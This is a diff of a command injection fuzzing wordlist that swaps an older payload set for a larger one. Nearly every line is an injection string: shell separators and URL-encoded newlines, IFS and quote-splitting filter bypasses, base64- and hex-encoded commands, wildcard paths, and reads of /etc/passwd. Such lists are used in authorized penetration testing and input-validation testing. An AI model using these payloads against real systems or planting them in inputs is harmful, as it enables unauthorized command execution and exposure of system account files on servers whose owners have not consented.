@@ -1,46 +1,79 @@
-$(id)
-$((id))
-$IFS$9id
-$(IFS)id
-${IFS}id
-$(whoami)
-%09id
-%0a id
-%0d id
-%26 id
-%3b id
-%7c id
-;cat /etc/passwd
-{cat,/etc/passwd}
-c"a"t /etc/passwd
-c'a't /etc/passwd
-c\at /etc/passwd
-cmd /c whoami
-&&id
-&id
-;id
-;id;
+; id
+| id
+& id
+&& id
+|| id
 `id`
-{id}
-||id
+$(id)
+;id
 |id
+&id
+&&id
+||id
+;${IFS}id
+|${IFS}id
+;$IFS$9id
+;{id}
+;{id,}
+;(id)
+${IFS}id
+$IFS$9id
+;i''d
+;i'd
+;i"d"
+;i\d
+;\id
+;\i\d
+;id$@
+;id$*
+;a=id;$a
+;a=i;b=d;$a$b
+;a=i;b=d;c=;$a$b$c
+;X=id;$X
+;$(echo id)
+;$(echo aWQ= | base64 -d)
+;$(printf "id")
+;$(printf "id")
+;$(echo -e "\x69\x64")
+;eval $(echo id)
+;eval $(echo aWQ= | base64 -d)
+;$'id'
+;$'id'
+;$'id'
+;{c,a,t} /etc/passwd
+;{ca,t} /etc/passwd
+;/???/cat /etc/passwd
+;/b??/cat /etc/passwd
+;/b?n/id
+;/???/id
+;cat</etc/passwd
+;cat<>/etc/passwd
+;{cat,/etc/passwd}
+;cat /etc/pa????
+;cat /etc/pass*
+;cat /etc/[p]asswd
+%0aid
+%0acat%20/etc/passwd
+%0als
+%0awhoami
+%0d%0aid
+
 id
-id&
-id&&
-id;
-id|
-id||
+
+id
 ;id%00
-id%00
-;id%0a
-id%0a
-id%0d
-;id%0d%0a
-;ls
-\nid
-powershell whoami
-\rid
-/???/??ss??
-;whoami
-`whoami`
-|whoami
+;id%00.txt
+;id #
+; id #
+&id #
+|id #
+;id&&
+;id||
+;a=id;$a #bypass
+;$(whoa\mi)
+;$(wh\oami)
+;w'h'o'a'm'i
+;w"h"o"a"m"i
+;w\hoami
+;wh\oami
+;whomi
